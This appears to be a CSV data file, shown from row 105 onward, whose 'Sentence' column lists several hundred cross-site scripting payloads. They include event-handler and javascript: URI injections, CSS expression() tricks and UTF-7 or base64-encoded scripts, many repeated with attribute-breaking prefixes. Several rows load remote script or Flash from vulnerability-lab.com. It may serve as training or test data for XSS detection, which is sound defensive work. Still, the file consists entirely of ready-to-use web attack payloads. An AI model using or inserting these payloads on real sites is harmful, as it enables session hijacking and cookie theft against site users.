,Sentence
105,"""x"" onerror=""alert(1)""></picture>"
106,""",,,,,x"" onerror=""alert(1)"">"
107,"""javascript:alert(1)""></table>"
108,"""--><img src=x onerror=alert(1)//"">"
109,"""</comment><img src=x onerror=alert(1)//"">"
110,"""</style><img src=x onerror=alert(1)//"">"
111,list-style:url() onerror=alert(1)></li>
112,"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>"
113,"""javascript://""/></head><body><a href=""/. /,alert(1)//"
114,"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></object>"
115,"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>"
116,<b <script>alert(1)//</script>0</script></b>
117,"""div1""><input value=""``onmouseover=alert(1)""></div> <div id=""div2""></div>"
118,"document.getelementbyid(""div1"").innerhtml;</script>"
119,width:1px;filter:glow onfilterchange=alert(1)>x</div>
120,mhtml:http://html5sec.org/test.html!xss.html></iframe>
121,"""x` `<script>alert(1)</script>""` `>"
122,"alt=alert(1)//"">"
123,alert(1)></title><title title=></title>
124,xx:xx onerror=alert(1)//--!>
125,"""-o-link:'javascript:alert(1)';-o-link-source:current"">x</a>"
126,"<style>@import ""data:,*{x:expression(write(1))}"";</style>"
127,x:expression8write(1)9>
128,"$,_=1}}).$=alert</script>"
129,"<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>"
130,"function,[{}][0].constructor._('alert(1)')()</script>"
131,"""#"">{alert(1)}</script>;1"
132,<b><script<b></b><alert(1)</script </b></b>
133,"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
134,"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
135,<script>document.cookie=true;</script>
136,"<img src=""jav ascript:document.cookie=true;"">"
137,"<img src=""javascript:document.cookie=true;"">"
138,"<img src="" javascript:document.cookie=true;"">"
139,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
140,<script>document.cookie=true;//<</script>
141,<script <b>document.cookie=true;</script>
142,"<iframe src=""javascript:document.cookie=true;>"
143,<script>a=/crosssitescripting/ document.cookie=true;</script>
144,</title><script>document.cookie=true;</script>
145,"<input type=""image"" src=""javascript:document.cookie=true;"">"
146,"<body background=""javascript:document.cookie=true;"">"
147,<body onload=document.cookie=true;>
148,"<img dynsrc=""javascript:document.cookie=true;"">"
149,"<img lowsrc=""javascript:document.cookie=true;"">"
150,"<bgsound src=""javascript:document.cookie=true;"">"
151,"<br size=""&{document.cookie=true}"">"
152,"<layer src=""javascript:document.cookie=true;""></layer>"
153,"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
154,"<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
155,scriptdocument.cookie=true;/script
156,"<iframe src=""javascript:document.cookie=true;""></iframe>"
157,"<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
158,"<table background=""javascript:document.cookie=true;"">"
159,"<table><td background=""javascript:document.cookie=true;"">"
160,"<div style=""background-image: url(javascript:document.cookie=true;)"">"
161,"<div style=""width: expression(document.cookie=true);"">"
162,<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
163,"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
164,"<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
165,"exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
166,"<style type=""text/javascript"">document.cookie=true;</style>"
167,<body onload=alert('xss')>
168,"<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
169,"<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
170,"<base href=""javascript:document.cookie=true;//"">"
171,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
172,"<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
173,"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
174,"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
175,<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
176,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
177,"<a href=""javascript#document.cookie=true;"">"
178,"<div onmouseover=""document.cookie=true;"">"
179,"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
180,&<script>document.cookie=true;</script>
181,&{document.cookie=true;};
182,<img src=&{document.cookie=true;};>
183,"<img src=""mocha:document.cookie=true;"">"
184,"<img src=""livescript:document.cookie=true;"">"
185,"<a href=""about:<script>document.cookie=true;</script>"">"
186,"<body onload=""document.cookie=true;"">"
187,"<div style=""background-image: url(javascript:document.cookie=true;);"">"
188,"<div style=""behaviour: url([link to code]);"">"
189,"<div style=""binding: url([link to code]);"">"
190,"<div style=""width: expression(document.cookie=true;);"">"
191,"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
192,<style><!--</style><script>document.cookie=true;//--></script>
193,<<script>document.cookie=true;</script>
194,<script>document.cookie=true;//--></script>
195,<!-- -- --><script>document.cookie=true;</script><!-- -- -->
196,"<img src=""blah""onmouseover=""document.cookie=true;"">"
197,"<img src=""blah>"" onmouseover=""document.cookie=true;"">"
198,"<xml src=""javascript:document.cookie=true;"">"
199,"<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
200,"<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
201,">""<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
202,">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
203,">""<script>document.cookie=true;</script>"
204,">""<img src=""jav ascript:document.cookie=true;"">"
205,">""<img src=""javascript:document.cookie=true;"">"
206,">""<img src="" javascript:document.cookie=true;"">"
207,">""<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
208,">""<script>document.cookie=true;//<</script>"
209,">""<script <b>document.cookie=true;</script>"
210,">""<iframe src=""javascript:document.cookie=true;>"
211,">""<script>a=/crosssitescripting/ document.cookie=true;</script>"
212,">""</title><script>document.cookie=true;</script>"
213,">""<input type=""image"" src=""javascript:document.cookie=true;"">"
214,">""<body background=""javascript:document.cookie=true;"">"
215,">""<body onload=document.cookie=true;>"
216,">""<img dynsrc=""javascript:document.cookie=true;"">"
217,">""<img lowsrc=""javascript:document.cookie=true;"">"
218,">""<bgsound src=""javascript:document.cookie=true;"">"
219,">""<br size=""&{document.cookie=true}"">"
220,">""<layer src=""javascript:document.cookie=true;""></layer>"
221,">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
222,">""<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
223,">""scriptdocument.cookie=true;/script"
224,">""<iframe src=""javascript:document.cookie=true;""></iframe>"
225,">""<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
226,">""<table background=""javascript:document.cookie=true;"">"
227,">""<table><td background=""javascript:document.cookie=true;"">"
228,">""<div style=""background-image: url(javascript:document.cookie=true;)"">"
229,">""<div style=""width: expression(document.cookie=true);"">"
230,">""<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>"
231,">""<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
232,">""<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
233,">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
234,">""<style type=""text/javascript"">document.cookie=true;</style>"
235,">""<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
236,">""<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
237,">""<base href=""javascript:document.cookie=true;//"">"
238,">""<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>"
239,">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
240,">""<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
241,">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
242,">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>"
243,">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
244,">""<a href=""javascript#document.cookie=true;"">"
245,">""<div onmouseover=""document.cookie=true;"">"
246,">""<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
247,">""&<script>document.cookie=true;</script>"
248,">""&{document.cookie=true;};"
249,">""<a href=""about:<script>document.cookie=true;</script>"">"
250,">""<body onload=""document.cookie=true;"">"
251,">""<div style=""background-image: url(javascript:document.cookie=true;);"">"
252,">""<div style=""behaviour: url([link to code]);"">"
253,">""<div style=""binding: url([link to code]);"">"
254,">""<div style=""width: expression(document.cookie=true;);"">"
255,">""<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
256,">""<style><!--</style><script>document.cookie=true;//--></script>"
257,">""<<script>document.cookie=true;</script>"
258,">""<script>document.cookie=true;//--></script>"
259,">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->"
260,">""<img src=""blah""onmouseover=""document.cookie=true;"">"
261,">""<img src=""blah>"" onmouseover=""document.cookie=true;"">"
262,">""<xml src=""javascript:document.cookie=true;"">"
263,">""<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
264,">""<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
265,"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
266,"-1<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
267,-1<script>document.cookie=true;</script>
268,"-1<img src=""jav ascript:document.cookie=true;"">"
269,"-1<img src=""javascript:document.cookie=true;"">"
270,"-1<img src="" javascript:document.cookie=true;"">"
271,"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
272,-1<script>document.cookie=true;//<</script>
273,-1<script <b>document.cookie=true;</script>
274,"-1<iframe src=""javascript:document.cookie=true;>"
275,-1<script>a=/crosssitescripting/ document.cookie=true;</script>
276,-1</title><script>document.cookie=true;</script>
277,"-1<input type=""image"" src=""javascript:document.cookie=true;"">"
278,"-1<body background=""javascript:document.cookie=true;"">"
279,-1<body onload=document.cookie=true;>
280,"-1<img dynsrc=""javascript:document.cookie=true;"">"
281,"-1<img lowsrc=""javascript:document.cookie=true;"">"
282,"-1<bgsound src=""javascript:document.cookie=true;"">"
283,"-1<br size=""&{document.cookie=true}"">"
284,"-1<layer src=""javascript:document.cookie=true;""></layer>"
285,"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
286,"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
287,-1scriptdocument.cookie=true;/script
288,"-1<iframe src=""javascript:document.cookie=true;""></iframe>"
289,"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
290,"-1<table background=""javascript:document.cookie=true;"">"
291,"-1<table><td background=""javascript:document.cookie=true;"">"
292,"-1<div style=""background-image: url(javascript:document.cookie=true;)"">"
293,"-1<div style=""width: expression(document.cookie=true);"">"
294,-1<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
295,"-1<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
296,"-1<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
297,"-1exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
298,"-1<style type=""text/javascript"">document.cookie=true;</style>"
299,"-1<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
300,"-1<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
301,"-1<base href=""javascript:document.cookie=true;//"">"
302,"""><iframe src=a onload=alert(""vl"") <"
303,-1<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
304,"-1<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
305,"-1<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
306,"-1<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
307,-1<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
308,"-1<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
309,"-1<a href=""javascript#document.cookie=true;"">"
310,"-1<div onmouseover=""document.cookie=true;"">"
311,"-1<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
312,-1&<script>document.cookie=true;</script>
313,-1&{document.cookie=true;};
314,-1<img src=&{document.cookie=true;};>
315,"-1<img src=""mocha:document.cookie=true;"">"
316,"-1<img src=""livescript:document.cookie=true;"">"
317,"<img dyn id=xss src=""javascript:alert('xss')"">"
318,"-1<a href=""about:<script>document.cookie=true;</script>"">"
319,"-1<body onload=""document.cookie=true;"">"
320,"-1<div style=""background-image: url(javascript:document.cookie=true;);"">"
321,"-1<div style=""behaviour: url([link to code]);"">"
322,"-1<div style=""binding: url([link to code]);"">"
323,"-1<div style=""width: expression(document.cookie=true;);"">"
324,"-1<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
325,-1<style><!--</style><script>document.cookie=true;//--></script>
326,-1<<script>document.cookie=true;</script>
327,-1<script>document.cookie=true;//--></script>
328,-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->
329,"-1<img src=""blah""onmouseover=""document.cookie=true;"">"
330,"-1<img src=""blah>"" onmouseover=""document.cookie=true;"">"
331,"-1<xml src=""javascript:document.cookie=true;"">"
332,"-1<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
333,"-1<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
334,">""<iframe src=http://vulnerability-lab.com/>@gmail.com"
335,">""<script>alert(document.cookie)</script><div style=""1@gmail.com"
336,">""<script>alert(document.cookie)</script>@gmail.com"
337,<iframe src=http://vulnerability-lab.com/>@gmail.com
338,"<script>alert(document.cookie)</script><div style=""1@gmail.com"
339,<script>alert(document.cookie)</script>@gmail.com
340,"+49/>""<iframe src=http://vulnerability-lab.com>1337"
341,"""><iframe src='' onload=alert('mphone')>"
342,<iframe src=http://vulnerability-lab.com>1337+1
343,"><script>alert(""vlab"")</script>"
344,">""<iframe src=http://vulnerability-lab.com></iframe>"
345,<html><body>
346,"<button.onclick=""alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));"">string:from.char.code</button></body></html>"
347,"';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>"">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>"
348,"'';!--""<crosssitescripting>=&{()}"
349,"<script>alert(""crosssitescripting2"")</script>"
350,<script>alert(document.cookie)</script>
351,<iframe src=http://www.vulnerability-lab.com>
352,<script>alert('vl')</script>
353,"<!--#exec cmd=""/bin/echo '<scr'""--><!--#exec cmd=""/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'""-->"
354,<script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
355,"<img src=javascript:alert(""crosssitescripting"")>"";' >"
356,"<script>alert(""crosssitescripting"")</script>"";' >"
357,<!--[if gte ie 4]> <script>alert('crosssitescripting');</script> <![endif]-->
358,"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>"
359,"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>"
360,"<object type=""application/x-shockwave-flash"" data=""http://www.vulnerability-lab.com/hack.swf"" width=""300"" height=""300"">"
361,<script src=http://vulnerability-lab.com/crosssitescripting.js></script>
362,"<<script>alert(""crosssitescripting"");//<</script>"
363,<script src=http://vulnerability-lab.com/crosssitescripting.js?<b>
364,<script src=//vulnerability-lab.com/.js>
365,<script>a=/crosssitescripting/ alert(a.source)</script>
366,"<script a="">"" src=""http://vulnerability-lab.com/crosssitescripting.js""></script>"
367,"<script a=`>` src=""http://vulnerability-lab.com/crosssitescripting.js""></script>"
368,"<script>document.write(""<scri"");</script>pt src=""http://vulnerability-lab.com/crosssitescripting.js""></script>"
369,"</title><script>alert(""crosssitescripting"");</script>"
370,"<img src=""javascript:alert('crosssitescripting');"">"
371,<img src=javascript:alert('crosssitescripting')>
372,"<img src=javascript:alert(""crosssitescripting"")>"
373,"<img src=`javascript:alert(""rm'crosssitescripting'"")`>"
374,"<img """"""><script>alert(""crosssitescripting"")</script>"">"
375,"<img src=javascript:alert(string.fromcharcode(88,83,83))>"
376,"<img src=""jav ascript:alert('crosssitescripting');"">"
377,"<img src="" javascript:alert('crosssitescripting');"">"
378,"<img src=""javascript:alert('crosssitescripting')"""
379,"<img dynsrc=""javascript:alert('crosssitescripting')"">"
380,"<img lowsrc=""javascript:alert('crosssitescripting')"">"
381,"<img src='vbscript:msgbox(""crosssitescripting"")'>"
382,"<img src=""mocha:[code]"">"
383,"<img src=""livescript:[code]"">"
384,"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('crosssitescripting');"">"
385,"<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k"">"
386,"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('crosssitescripting');"">"
387,"<meta http-equiv=""link"" content=""<http://vulnerability-lab.com/crosssitescripting.css>; rel=stylesheet"">"
388,"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">"
389,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('crosssitescripting');+adw-/script+ad4-"
390,"<object type=""text/x-scriptlet"" data=""http://vulnerability-lab.com/scriptlet.html""></object>"
391,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>
392,"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>"
393,<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>
394,"<style type=""text/javascript"">alert('crosssitescripting');</style>"
395,"<style>.crosssitescripting{background-image:url(""javascript:alert('crosssitescripting')"");}</style><a class=crosssitescripting></a>"
396,"<style type=""text/css"">body{background:url(""javascript:alert('crosssitescripting')"")}</style>"
397,"<style>li {list-style-image: url(""javascript:alert('crosssitescripting')"");}</style><ul><li>crosssitescripting"
398,"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>"
399,"<div style=""background-image: url(javascript:alert('crosssitescripting'))"">"
400,"<div style=""background-image:52c8'a161332904a1c5248.10278.1053379'9"">"
401,"<div style=""width: expression(alert('crosssitescripting'));"">"
402,"<layer src=""http://vulnerability-lab.com/script.html""></layer>"
403,"<link rel=""stylesheet"" href=""javascript:alert('crosssitescripting');"">"
404,"<link rel=""stylesheet"" href=""http://vulnerability-lab.com/crosssitescripting.css"">"
405,"<body background=""javascript:alert('crosssitescripting')"">"
406,<body onload=alert('crosssitescripting')>
407,"<img low id=xss src=""javascript:alert('xss')"">"
408,"<bgsound id=xss src=""javascript:alert('xss');"">"
409,"<link rel=""stylesheet"" href=""javascript:alert('xss');"">"
410,"<img id=xss src='vbscript:msgbox(""xss"")'>"
411,"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"
